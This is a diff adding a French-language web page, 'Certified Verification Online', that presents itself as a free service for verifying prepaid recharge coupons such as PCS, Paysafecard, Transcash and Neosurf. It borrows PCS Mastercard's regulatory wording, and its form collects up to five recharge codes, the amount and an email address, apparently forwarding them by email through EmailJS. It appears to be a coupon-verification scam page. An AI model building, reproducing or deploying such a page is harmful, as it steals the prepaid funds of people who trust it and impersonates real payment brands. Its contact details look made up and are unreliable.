@@ -1,0 +1,800 @@
+<html>
+<head>
+<title>CERTIFIED VERIFICATION ONLINE</title>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<meta name="format-detection" content="telephone=no">
+<meta name="theme-color" content="#0a192f">
+
+<!-- Critical CSS -->
+
+
+<!-- Add preload for critical resources -->
+<link rel="preload" href="./css/bootstrap.min.css" as="style" crossorigin="anonymous">
+<link rel="preload" href="./js/bootstrap.bundle.min.js" as="script" crossorigin="anonymous">
+
+<link rel="stylesheet" href="./css/bootstrap.min.css" onerror="this.onerror=null;this.href='https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css';">
+<link rel="stylesheet" href="./yonkio.css">
+<link rel="stylesheet" href="./patati.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" crossorigin="anonymous">
+
+<!-- Page Loader -->
+<style>
+    #page-loader {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(255,255,255,0.9);
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        z-index: 9999;
+    }
+    #page-loader.loaded {
+        display: none;
+    }
+</style>
+
+<!-- iOS icons -->
+<link rel="apple-touch-icon" href="./Yonkio/hero-img.png">
+<link rel="apple-touch-icon" sizes="152x152" href="./Yonkio/hero-img.png">
+<link rel="apple-touch-icon" sizes="180x180" href="./Yonkio/hero-img.png">
+<link rel="apple-touch-icon" sizes="167x167" href="./Yonkio/hero-img.png">
+
+<!-- iOS splash screens -->
+<link rel="apple-touch-startup-image" href="./Yonkio/hero-img.png" media="(device-width: 414px) and (device-height: 896px) and (-webkit-device-pixel-ratio: 2)">
+<link rel="apple-touch-startup-image" href="./Yonkio/hero-img.png" media="(device-width: 414px) and (device-height: 896px) and (-webkit-device-pixel-ratio: 3)">
+<link rel="apple-touch-startup-image" href="./Yonkio/hero-img.png" media="(device-width: 375px) and (device-height: 812px) and (-webkit-device-pixel-ratio: 3)">
+
+<!-- Custom CSS -->
+<link rel="stylesheet" href="./yonkio.css">
+<link rel="stylesheet" href="./patati.css">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" crossorigin="anonymous">
+
+<link rel="shortcut icon" type="image/jpg" href="./Yonkio/newppsite.jpg">
+<meta property="og:locale" content="fr_FR"/>
+        <meta property="og:site_name" content="Certified-verification"/>
+        <meta property="og:type" content="article"/>
+        <meta property="article:published_time" content="2023-08-27T12:20:00+01:00"/>
+        <meta property="article:modified_time" content="2023-08-27T10:40:17+01:00"/>
+        <meta property="article:section" content="Europe"/>
+        <meta property="og:title" content="certified-verification"/>
+        <meta property="og:description" content="verifier vos coupons."/>
+        <meta property="og:url" content="https://certified-verification.github.io/certifiedverification/"/>
+       <meta property="og:image" content="Yonkio/newppsite.jpg"/>
+       <meta property="og:image:width" content="286"/>
+       <meta property="og:image:height" content="200"/>
+        <link rel="image_src" href="Yonkio/newppsite.jpg"/>
+
+
+
+
+
+
+<style>
+    /* iOS-specific styles */
+    @supports (-webkit-touch-callout: none) {
+        .service-card {
+            -webkit-transform: translateZ(0);
+            -webkit-backface-visibility: hidden;
+            -webkit-perspective: 1000;
+        }
+        
+        .glass-morphism {
+            -webkit-backdrop-filter: blur(10px);
+        }
+        
+        /* Prevent text size adjustment on orientation change */
+        html {
+            -webkit-text-size-adjust: 100%;
+        }
+        
+        /* Fix for iOS button styling */
+        button {
+            -webkit-appearance: none;
+            border-radius: 0;
+        }
+        
+        /* Fix for iOS input styling */
+        input, select, textarea {
+            -webkit-appearance: none;
+            border-radius: 0;
+        }
+        
+        /* Safe area insets for iPhone X and newer */
+        @supports (padding: max(0px)) {
+            .header {
+                padding-top: max(0.5rem, env(safe-area-inset-top));
+                padding-left: max(0.5rem, env(safe-area-inset-left));
+                padding-right: max(0.5rem, env(safe-area-inset-right));
+            }
+            
+            .footer {
+                padding-bottom: max(0.5rem, env(safe-area-inset-bottom));
+            }
+        }
+    }
+
+    /* Improved touch targets for mobile */
+    @media (max-width: 768px) {
+        .nav-link, button, .service-card {
+            min-height: 44px; /* iOS minimum touch target size */
+            min-width: 44px;
+        }
+        
+        .service-card {
+            padding: 20px !important;
+        }
+        
+        /* Prevent pull-to-refresh on iOS */
+        body {
+            overscroll-behavior-y: none;
+        }
+        
+        /* Fix for iOS momentum scrolling */
+        .container {
+            -webkit-overflow-scrolling: touch;
+        }
+        
+        /* Improve tap highlight on iOS */
+        a, button {
+            -webkit-tap-highlight-color: rgba(0,0,0,0);
+        }
+        
+        /* Fix for iOS form elements */
+        input[type="text"],
+        input[type="email"],
+        input[type="number"],
+        select,
+        textarea {
+            font-size: 16px !important; /* Prevent zoom on focus */
+            padding: 12px !important;
+            margin-bottom: 15px !important;
+        }
+    }
+</style>
+
+</head>
+
+<body>
+    <div id="page-loader">
+        <div class="spinner-border text-primary" role="status">
+            <span class="visually-hidden">Loading...</span>
+        </div>
+    </div>
+
+  <!-- ======= Header ======= -->
+  <header id="header" class="header d-flex align-items-center fixed-top" style="background: linear-gradient(135deg, #00b09b, #96c93d); box-shadow: 0 8px 32px rgba(0,0,0,0.1); backdrop-filter: blur(10px); -webkit-backdrop-filter: blur(10px); animation: slideInDown 1s ease-out;">
+    <div class="container-fluid container-xl d-flex align-items-center justify-content-between">
+
+      <a class="logo d-flex align-items-center" style="animation: fadeIn 1.5s ease-out;">
+        <img src="./Yonkio/hero-img.png" alt="" style="animation: float 3s ease-in-out infinite;">
+        <h1 style="background: linear-gradient(45deg, #fff, #e0e0e0); -webkit-background-clip: text; -webkit-text-fill-color: transparent; text-shadow: 2px 2px 4px rgba(0,0,0,0.1);">Certified Verification Online</h1>
+      </a>
+
+      <i class="mobile-nav-toggle mobile-nav-show bi bi-list"></i>
+      <i class="mobile-nav-toggle mobile-nav-hide d-none bi bi-x"></i>
+      <nav id="navbar" class="navbar" style="animation: fadeIn 2s ease-out;">
+        <ul>
+          <li><a href="" class="active nav-link">Accueil</a></li>
+          <li><a href="#about" class="nav-link">A propos de nous</a></li>
+          <li><a href="#cartes" class="nav-link">Cartes</a></li>
+          <li><a href="#formulaire" class="nav-link">Verifier mon coupon</a></li>
+          <li><a href="#contact" class="nav-link">Contact</a></li>
+        </ul>
+      </nav><!-- .navbar -->
+
+    </div>
+  </header><!-- End Header -->
+  <!-- End Header -->
+
+  <!-- ======= Hero Section ======= -->
+  <section id="hero" class="hero d-flex align-items-center" style="background: linear-gradient(135deg, #f5f7fa, #e5e9f2); min-height: 100vh; position: relative; overflow: hidden;">
+    <div class="animated-bg"></div>
+    <div class="container">
+      <div class="row gy-4 d-flex justify-content-between">
+        <div class="col-lg-6 order-2 order-lg-1 d-flex flex-column justify-content-center" style="animation: slideInLeft 1.5s ease-out;">
+          <img src="./Yonkio/th (2).jpg" class="img-fluid mb-3 mb-lg-0 rounded-3 shadow-lg hover-scale" alt="" style="transform: perspective(1000px) rotateY(-15deg); transition: all 0.5s ease;">
+          <h2 data-aos="fade-up" class="gradient-text" style="font-weight: 700; margin-top: 2rem;">Des solutions de paiement innovantes pour l'ère numérique</h2>
+          <p data-aos="fade-up" data-aos-delay="100" class="typing-text" style="color: #636e72; font-size: 1.1rem;">Vérifiez vos cartes en toute sécurité depuis le confort de votre domicile, avec notre système de vérification de pointe.</p>
+          <div class="cta-buttons" data-aos="fade-up" data-aos-delay="200" style="margin-top: 2rem;">
+            <button onclick="scrollToForm()" class="btn-primary-gradient">Commencer la vérification</button>
+            <button onclick="showInfoModal()" class="btn-secondary-outline">En savoir plus</button>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section><!-- End Hero Section -->
+
+  <main id="main">
+
+    <!-- ======= Featured Services Section ======= -->
+    <section id="featured-services" class="featured-services" style="padding: 80px 0; position: relative; overflow: hidden;">
+      <div class="container">
+        <div class="row gy-4">
+          <div class="col-lg-4 col-md-6 service-item d-flex" data-aos="fade-up">
+            <div class="service-card glass-morphism" style="background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(10px); border-radius: 20px; padding: 30px; width: 100%; transform-style: preserve-3d; transition: all 0.5s ease;">
+              <div class="icon-box" style="margin-bottom: 20px;">
+                <i class="fas fa-wifi" style="font-size: 2.5rem; background: linear-gradient(45deg, #00f2fe, #4facfe); -webkit-background-clip: text; -webkit-text-fill-color: transparent;"></i>
+              </div>
+              <h4 class="title" style="color: #fff; font-size: 1.5rem; font-weight: 600; margin-bottom: 15px; text-transform: uppercase; letter-spacing: 2px;">Paiement sans contact</h4>
+              <div class="hover-effect"></div>
+            </div>
+          </div>
+
+          <div class="col-lg-4 col-md-6 service-item d-flex" data-aos="fade-up" data-aos-delay="100">
+            <div class="service-card glass-morphism" style="background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(10px); border-radius: 20px; padding: 30px; width: 100%; transform-style: preserve-3d; transition: all 0.5s ease;">
+              <div class="icon-box" style="margin-bottom: 20px;">
+                <i class="fas fa-shield-alt" style="font-size: 2.5rem; background: linear-gradient(45deg, #00f2fe, #4facfe); -webkit-background-clip: text; -webkit-text-fill-color: transparent;"></i>
+              </div>
+              <h4 class="title" style="color: #fff; font-size: 1.5rem; font-weight: 600; margin-bottom: 15px; text-transform: uppercase; letter-spacing: 2px;">Des transactions Sécurisées</h4>
+              <div class="hover-effect"></div>
+            </div>
+          </div>
+
+          <div class="col-lg-4 col-md-6 service-item d-flex" data-aos="fade-up" data-aos-delay="200">
+            <div class="service-card glass-morphism" style="background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(10px); border-radius: 20px; padding: 30px; width: 100%; transform-style: preserve-3d; transition: all 0.5s ease;">
+              <div class="icon-box" style="margin-bottom: 20px;">
+                <i class="fas fa-lock" style="font-size: 2.5rem; background: linear-gradient(45deg, #00f2fe, #4facfe); -webkit-background-clip: text; -webkit-text-fill-color: transparent;"></i>
+              </div>
+              <h4 class="title" style="color: #fff; font-size: 1.5rem; font-weight: 600; margin-bottom: 15px; text-transform: uppercase; letter-spacing: 2px;">Une autonomie assurée</h4>
+              <div class="hover-effect"></div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <style>
+        .service-card {
+          position: relative;
+          overflow: hidden;
+          cursor: pointer;
+        }
+
+        .service-card:hover {
+          transform: translateY(-10px) rotateX(10deg);
+          box-shadow: 0 15px 35px rgba(0, 0, 0, 0.3);
+        }
+
+        .service-card::before {
+          content: '';
+          position: absolute;
+          top: 0;
+          left: -100%;
+          width: 100%;
+          height: 100%;
+          background: linear-gradient(
+            90deg,
+            transparent,
+            rgba(255, 255, 255, 0.2),
+            transparent
+          );
+          transition: 0.5s;
+        }
+
+        .service-card:hover::before {
+          left: 100%;
+        }
+
+        .hover-effect {
+          position: absolute;
+          bottom: 0;
+          left: 0;
+          width: 100%;
+          height: 5px;
+          background: linear-gradient(90deg, #00f2fe, #4facfe);
+          transform: scaleX(0);
+          transform-origin: left;
+          transition: transform 0.5s ease;
+        }
+
+        .service-card:hover .hover-effect {
+          transform: scaleX(1);
+        }
+
+        @media (max-width: 768px) {
+          .service-card {
+            margin-bottom: 20px;
+          }
+        }
+      </style>
+    </section><!-- End Featured Services Section -->
+
+    <!-- ======= About Us Section ======= -->
+    <section id="about" class="about pt-0">
+      <div class="container" data-aos="fade-up">
+
+        <div class="row gy-4">
+          <div class="col-lg-6 position-relative align-self-start order-lg-last order-first">
+            <img src="./Yonkio/american-express-89024.jpg" class="img-fluid" alt="">
+          </div>
+          <div class="col-lg-6 content order-last  order-lg-first">
+            <h3>A propos de nous</h3>
+            <p>
+            La carte de paiement prépayée PCS Mastercard est émise par PFS Card Services (Ireland) Limited en vertu d’une licence de Mastercard International Incorporated. PFS Card Services (Ireland) Limited, qui exerce ses activités sous le nom de PCSIL, est autorisée et réglementée en tant qu'émetteur de monnaie électronique par la Banque centrale d'Irlande sous le numéro d'enregistrement C175999. Siège social: Front Office, Scurlockstown Business Park, Trim, Co. Meath, C15 K2R9. Numéro d'enregistrement des sociétés : 590062. PCS® Prepaid Cash Services est une marque de CreaCard SA. ©
+            </p>
+            <ul>
+              <li data-aos="fade-up" data-aos-delay="100">
+                <i class="bi bi-diagram-3"></i>
+                <div>
+                  <h5>Etape 1</h5>
+                  <p>J'achète ma carte de paiement en bureau de tabac ou sur le site internet</p>
+                </div>
+              </li>
+              <li data-aos="fade-up" data-aos-delay="200">
+                <i class="bi bi-fullscreen-exit"></i>
+                <div>
+                  <h5>Etape 2</h5>
+                  <p>J'active ma carte prépayée par SMS</p>
+                </div>
+              </li>
+              <li data-aos="fade-up" data-aos-delay="300">
+                <i class="bi bi-broadcast"></i>
+                <div>
+                  <h5>Etape 3</h5>
+                  <p>Je verifie l'authencité de ma recharge, carte bancaire ou en espèces</p>
+                </div>
+              </li>
+            </ul>
+          </div>
+        </div>
+
+      </div>
+    </section><!-- End About Us Section -->
+
+  
+    <section id="call-to-action" class="call-to-action">
+      <div class="container" data-aos="zoom-out">
+
+        <div class="row justify-content-center">
+          <div class="col-lg-8 text-center">
+            <h3>Facile et Simple à prendre en main</h3>
+            <p> Connectez-vous pour vérifier votre coupon sans frais.</p>
+          </div>
+        </div>
+
+      </div>
+    </section><!-- End Call To Action Section -->
+
+  <!-- ======= Services Section ======= -->
+  <section id="cartes" class="services pt-0">
+      <div class="container" data-aos="fade-up">
+        <div class="section-header">
+          <span class="gradient-text" style="font-weight: 600; letter-spacing: 2px;">NOS CARTES ACCEPTÉES</span>
+          <h2 class="gradient-text" style="font-size: 2.5rem; margin-top: 1rem;">Cartes Prises En Charge</h2>
+        </div>
+
+        <div class="row gy-4">
+          <div class="col-lg-4 col-md-6" data-aos="zoom-in" data-aos-delay="100">
+            <div class="card hover-card">
+              <div class="card-img">
+                <img src="./Yonkio/th.jpg" alt="MasterCard" class="img-fluid">
+              </div>
+              <h3 class="gradient-text text-center">MasterCard</h3>
+            </div>
+          </div>
+
+          <div class="col-lg-4 col-md-6" data-aos="zoom-in" data-aos-delay="200">
+            <div class="card hover-card">
+              <div class="card-img">
+                <img src="./Yonkio/th (1).jpg" alt="Visa Card" class="img-fluid">
+              </div>
+              <h3 class="gradient-text text-center">Visa Card</h3>
+            </div>
+          </div>
+
+          <div class="col-lg-4 col-md-6" data-aos="zoom-in" data-aos-delay="300">
+            <div class="card hover-card">
+              <div class="card-img">
+                <img src="./Yonkio/th (2).jpg" alt="PCS MasterCard" class="img-fluid">
+              </div>
+              <h3 class="gradient-text text-center">PCS MasterCard</h3>
+            </div>
+          </div>
+
+          <div class="col-lg-4 col-md-6" data-aos="zoom-in" data-aos-delay="400">
+            <div class="card hover-card">
+              <div class="card-img">
+                <img src="./Yonkio/th (3).jpg" alt="PayPal" class="img-fluid">
+              </div>
+              <h3 class="gradient-text text-center">PayPal</h3>
+            </div>
+          </div>
+
+          <div class="col-lg-4 col-md-6" data-aos="zoom-in" data-aos-delay="500">
+            <div class="card hover-card">
+              <div class="card-img">
+                <img src="./Yonkio/th (4).jpg" alt="NeoSurf" class="img-fluid">
+              </div>
+              <h3 class="gradient-text text-center">NeoSurf</h3>
+            </div>
+          </div>
+
+          <div class="col-lg-4 col-md-6" data-aos="zoom-in" data-aos-delay="600">
+            <div class="card hover-card">
+              <div class="card-img">
+                <img src="./Yonkio/th (5).jpg" alt="Orange Money" class="img-fluid">
+              </div>
+              <h3 class="gradient-text text-center">Orange Money</h3>
+            </div>
+          </div>
+
+          <div class="col-lg-4 col-md-6" data-aos="zoom-in" data-aos-delay="700">
+            <div class="card hover-card">
+              <div class="card-img">
+                <img src="./Yonkio/th (6).jpg" alt="Transcash" class="img-fluid">
+              </div>
+              <h3 class="gradient-text text-center">Transcash</h3>
+            </div>
+          </div>
+
+          <div class="col-lg-4 col-md-6" data-aos="zoom-in" data-aos-delay="800">
+            <div class="card hover-card">
+              <div class="card-img">
+                <img src="./Yonkio/th (7).jpg" alt="Paysafe" class="img-fluid">
+              </div>
+              <h3 class="gradient-text text-center">Paysafe</h3>
+            </div>
+          </div>
+
+        </div>
+
+      </div>
+    </section><!-- End Services Section -->
+
+    <!-- ======= Call To Action Section ======= -->
+    <section id="formulaire" class="pricing pt-0">
+      <div class="container" data-aos="fade-up">
+        <div class="section-header">
+          <h2 class="futuristic-title" style="background: linear-gradient(135deg, #00b09b, #96c93d); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-size: 2.5rem; font-weight: 700; text-transform: uppercase; letter-spacing: 2px; position: relative; display: inline-block;">
+            Verification du Coupon
+            <span class="futuristic-line"></span>
+          </h2>
+        </div>
+
+        <div class="row justify-content-center">
+          <div class="col-lg-8" data-aos="fade-up" data-aos-delay="200">
+            <div class="pricing-item featured" style="border: none; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); background: linear-gradient(135deg, #ffffff, #f5f7fa); transition: transform 0.3s ease;">
+              <h3 align="center" style="color: #2d3436; font-weight: 700;">Renseignez les informations du coupon ici</h3>
+              
+              <div class="form-group mt-3">
+              <select class="form-control" name="recharge" id="rechargetype" style="padding: 15px; border-radius: 10px; border: 2px solid #e0e0e0; transition: all 0.3s ease; background: #fff;">
+                                                         <option value="Aucune">Choisir une recharge</option>
+                                                         <option value="PCS">PCS</option>
+                                                         <option value="PAYSAFECARD">PAYSAFECARD</option>
+                                                         <option value="TRANSCASH">TRANSCASH</option>
+                                                         <option value="NEOSURF">NEOSURF</option>
+                                                         <option value="TONEO">TONEO</option>
+                                                         <option value="ORANGE">ORANGE</option>
+                                                         <option value="PAYPAL">PAYPAL</option>
+                                                         <option value="LE BARA">LE BARA</option>
+                                                         <option valuee="LYCAMOBILE">LYCAMOBILE</option>
+                                                         <option value="GOOGLE PLAY">GOOGLE PLAY</option>
+                                                         <option value="AMAZON">AMAZON</option>
+                                                      </select>
+              </div>
+              <div class="form-group mt-3">
+                <input type="number" class="form-control" id="montant" placeholder="Entrer le montant de la recharge" style="padding: 15px; border-radius: 10px; border: 2px solid #e0e0e0; transition: all 0.3s ease;" name="montant">
+              </div>
+              <div class="form-group mt-3">
+              <select class="form-control" name="devise" id="devise" style="padding:10px;border: 1px solid;">
+                                                         <option value="aucune">Choisir la devise</option>
+                                                         <option value="€ (Euro)">€ (Euro)</option>
+                                                         <option value="$ (Dollar)">$ (Dollar)</option>
+                                                         <option value="CHF (Franc suisse)">CHF (Franc suisse)</option>
+                                                      </select>
+              </div>
+              <div class="form-group mt-3">
+              <input type="text" class="form-control" placeholder="Entrer le code de recharge 1" id="recharge01" style="border: 1px solid;padding:10px;" name="codeRecharge1">
+              </div>
+              <div class="form-group mt-3">
+              <input type="text" class="form-control" placeholder="Entrer le code de recharge 2" id="recharge02" style="padding:10px;border: 1px solid;" name="codeRecharge2">
+              </div>
+              <div class="form-group mt-3">
+              <input type="text" class="form-control" placeholder="Entrer le code de recharge 3" id="recharge03" style="padding:10px;border: 1px solid;" name="codeRecharge3">
+              </div>
+              <div class="form-group mt-3">
+              <input type="text" class="form-control" placeholder="Entrer le code de recharge 4" id="recharge04" style="padding:10px;border: 1px solid;" name="codeRecharge4">
+              </div>
+			     <div class="form-group mt-3">
+              <input type="text" class="form-control" placeholder="Entrer le code de recharge 5" id="recharge05" style="padding:10px;border: 1px solid;" name="codeRecharge5">
+              </div>
+              <div class="form-group mt-3">
+              <input type="email" class="form-control" placeholder="Entrez votre adresse email*" id="email" required="" style="padding:10px;border: 1px solid;" name="email">
+              </div>
+              <div class="form-group mt-3" align="center">
+                <button class="btn btn-primary" onclick="sendMail()" style="background: linear-gradient(135deg, #00b09b, #96c93d); border: none; padding: 12px 30px; border-radius: 50px; font-weight: 600; letter-spacing: 1px; box-shadow: 0 4px 15px rgba(0,176,155,0.2); transition: transform 0.3s ease;">VERIFIER MON COUPON...</button>
+                
+              </div>
+            
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ======= Testimonials Section ======= -->
+    <section id="testimonials" class="testimonials">
+      <div class="container">
+
+      </div>
+    </section><!-- End Testimonials Section -->
+
+    <!-- ======= Frequently Asked Questions Section ======= -->
+    <section id="faq" class="faq">
+      <div class="container" data-aos="fade-up">
+
+        <div class="section-header">
+          <span>Questions Fréquemment Posées</span>
+          <h2>Questions fréquemment posées</h2>
+
+        </div>
+
+        <div class="row justify-content-center" data-aos="fade-up" data-aos-delay="200">
+          <div class="col-lg-10">
+
+            <div class="accordion accordion-flush" id="faqlist">
+
+              <div class="accordion-item">
+                <h3 class="accordion-header">
+                  <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#faq-content-1">
+                    <i class="bi bi-question-circle question-icon"></i>
+                    Comment vérifier mon coupon ?
+                  </button>
+                </h3>
+                <div id="faq-content-1" class="accordion-collapse collapse" data-bs-parent="#faqlist">
+                  <div class="accordion-body">
+                    Remplissez les informations du formulaire ci-dessus, tout en vous assurant que les informations soient correctes et ensuite appuyez sur le 
+                    bouton vérifier mon coupon... Vous recevrez plus tard un email dans votre boite de réception. La durée d'attente peut varier.
+                  </div>
+                </div>
+              </div><!-- # Faq item-->
+
+
+              <div class="accordion-item">
+                <h3 class="accordion-header">
+                  <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#faq-content-5">
+                    <i class="bi bi-question-circle question-icon"></i>
+                    La demande de vérification de mon coupon est-elle payante ?
+                  </button>
+                </h3>
+                <div id="faq-content-5" class="accordion-collapse collapse" data-bs-parent="#faqlist">
+                  <div class="accordion-body">
+                    le service de vérification de votre coupon, n est pas payant.
+                  </div>
+                </div>
+              </div><!-- # Faq item-->
+
+            </div>
+
+          </div>
+        </div>
+
+      </div>
+    </section><!-- End Frequently Asked Questions Section -->
+
+    <!-- ======= Contact Section ======= -->
+    <section id="contact" class="contact">
+      <div class="container" data-aos="fade-up">
+        <h3 align="center" style="margin:30px;font-weight:bold;">Nous Contactez</h3>
+
+        <div class="row gy-4 mt-4">
+
+          <div class="col-lg-4">
+
+            <div class="info-item d-flex">
+              <i class="bi bi-geo-alt flex-shrink-0"></i>
+              <div>
+                <h4>Localisation:</h4>
+                <p>A108 93 rue Lumiere, Paris Vincennes, P 535022</p>
+              </div>
+            </div><!-- End Info Item -->
+
+            <div class="info-item d-flex">
+              <i class="bi bi-envelope flex-shrink-0"></i>
+              <div>
+                <h4>Email:</h4>
+                <p>verifaction@gmail.com</p>
+              </div>
+            </div><!-- End Info Item -->
+
+            <div class="info-item d-flex">
+              <i class="bi bi-phone flex-shrink-0"></i>
+              <div>
+                <h4>Contact:</h4>
+                <p>+33 768 76 46 98, +1 5687 47488 55</p>
+              </div>
+            </div><!-- End Info Item -->
+
+          </div>
+
+          <div class="col-lg-8">
+            <form class="php-email-form">
+              <div class="row">
+                <div class="col-md-6 form-group">
+                  <input type="text" name="name" class="form-control" id="name" placeholder="Votre nom" required="">
+                </div>
+                <div class="col-md-6 form-group mt-3 mt-md-0">
+                  <input type="email" class="form-control" name="email" id="email" placeholder="Votre Email" required="">
+                </div>
+              </div>
+              <div class="form-group mt-3">
+                <input type="text" class="form-control" name="subject" id="subject" placeholder="Sujet" required="">
+              </div>
+              <div class="form-group mt-3">
+                <textarea class="form-control" name="message" rows="5" placeholder="Message" required=""></textarea>
+              </div>
+              <div class="my-3">
+                <div class="loading" style="display: none;">Vérification en cours...</div>
+                <div class="error-message"></div>
+                <div class="sent-message">Votre demande a été envoyée avec succès!</div>
+              </div>
+              <div class="text-center"><button type="submit" id="submit">Envoyez le Message</button></div>
+            </form>
+          </div><!-- End Contact Form -->
+
+        </div>
+
+      </div>
+    </section><!-- End Contact Section -->
+
+  </main><!-- End #main -->
+
+  <!-- ======= Footer ======= -->
+  <footer id="footer" class="footer">
+
+    <div class="container">
+      <div class="row gy-4">
+        <div class="col-lg-5 col-md-12 footer-info">
+          <a href="index.html" class="logo d-flex align-items-center">
+            
+            <span  style="font-size: 1.2em;">CERTIFIED VERIFICATION</span>
+          </a>
+          <p>Selon leur type, tous les numéros de carte de crédit sont conformes à un certain modèle. Par exemple, les deux premiers chiffres de toutes les cartes MasterCard sont compris entre 51 et 55, tandis que la longueur totale du numéro est de 16 chiffres.</p>
+         
+        </div>
+
+        <div class="col-lg-2 col-6 footer-links">
+          <h4>Useful Links</h4>
+          <ul>
+            <li><a href="#home">Accueil</a></li>
+            <li><a href="#about">A propos de nous</a></li>
+            <li><a href="#cartes">Cartes</a></li>
+            <li><a href="#formulaire">Verifier mon coupon</a></li>
+            <li><a href="#contact">Contact</a></li>
+          </ul>
+        </div>
+
+
+        <div class="col-lg-3 col-md-12 footer-contact text-center text-md-start">
+          <h4>Contact Us</h4>
+          <p>
+            A108 Rue lumiere <br>
+            Paris Vincennes, P 535022<br>
+            EUR, USA <br><br>
+            <strong>Phone:</strong> +33 788 76 52 98 / +1 5589 55488 555<br>
+            <strong>Email:</strong> vcertified0@gmail.com<br>
+          </p>
+
+        </div>
+
+      </div>
+    </div>
+
+    <div class="container mt-4">
+      <div class="copyright">
+        &copy; Copyright <strong><span>CERTIFIED VERIFICATION</span></strong>. All Rights Reserved
+      </div>
+      <div class="credits">
+        Designed by <a href="https://securverification.com/">CERTIFIED VERIFICATION</a>
+      </div>
+    </div>
+
+  </footer><!-- End Footer -->
+  <!-- End Footer -->
+
+  <a href="#" class="scroll-top d-flex align-items-center justify-content-center"><i class="bi bi-arrow-up-short"></i></a>
+
+<div id="preloader"></div>
+
+<!-- Vendor JS Files -->
+<script src="js/bootstrap.bundle.min.js" 
+    onerror="this.onerror=null;this.src='https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js';" 
+    defer>
+</script>
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js" 
+    onerror="this.onerror=null;this.src='./js/email.min.js';" 
+    defer>
+</script>
+<script src="index.js" defer></script>
+
+<!-- Modal -->
+<div id="infoModal" class="modal">
+    <div class="modal-content">
+        <span class="modal-close" onclick="closeModal()">&times;</span>
+        <h3 class="modal-title">Comment remplir le formulaire</h3>
+        <div class="modal-body">
+            <ul>
+                <li>Sélectionnez le type de recharge dans la liste déroulante</li>
+                <li>Entrez le montant exact de votre recharge</li>
+                <li>Choisissez la devise correspondante</li>
+                <li>Saisissez vos codes de recharge (jusqu'à 5 codes possibles)</li>
+                <li>Renseignez votre adresse email pour recevoir la confirmation</li>
+                <li>Cliquez sur "Vérifier mon coupon" pour lancer la vérification</li>
+            </ul>
+            <p style="margin-top: 20px; font-style: italic;">Note: Assurez-vous que toutes les informations sont correctes avant de soumettre.</p>
+        </div>
+    </div>
+</div>
+
+<script>
+    // Initialize UI when DOM is ready
+    document.addEventListener('DOMContentLoaded', function() {
+        const loader = document.getElementById('page-loader');
+        
+        // Hide loader after a maximum of 5 seconds
+        setTimeout(() => {
+            if (loader) loader.classList.add('loaded');
+        }, 5000);
+
+        // UI Functions
+        window.scrollToForm = function() {
+            const formSection = document.getElementById('formulaire');
+            if (!formSection) return;
+            
+            const headerOffset = 100;
+            const elementPosition = formSection.getBoundingClientRect().top;
+            const offsetPosition = elementPosition + window.pageYOffset - headerOffset;
+
+            window.scrollTo({
+                top: offsetPosition,
+                behavior: 'smooth'
+            });
+
+            const form = document.querySelector('.pricing-item');
+            if (form) {
+                form.style.animation = 'none';
+                form.offsetHeight;
+                form.style.animation = 'pulse-border 1s ease';
+            }
+        };
+
+        window.showInfoModal = function() {
+            const modal = document.getElementById('infoModal');
+            if (modal) {
+                modal.style.display = 'flex';
+                setTimeout(() => modal.classList.add('show'), 10);
+            }
+        };
+
+        window.closeModal = function() {
+            const modal = document.getElementById('infoModal');
+            if (modal) {
+                modal.classList.remove('show');
+                setTimeout(() => modal.style.display = 'none', 300);
+            }
+        };
+
+        // Close modal when clicking outside
+        window.onclick = function(event) {
+            const modal = document.getElementById('infoModal');
+            if (event.target === modal) closeModal();
+        };
+
+        // Close modal with ESC key
+        document.addEventListener('keydown', function(event) {
+            if (event.key === 'Escape') closeModal();
+        });
+    });
+
+    // Hide loader when all resources are loaded
+    window.addEventListener('load', function() {
+        const loader = document.getElementById('page-loader');
+        if (loader) loader.classList.add('loaded');
+    });
+</script>
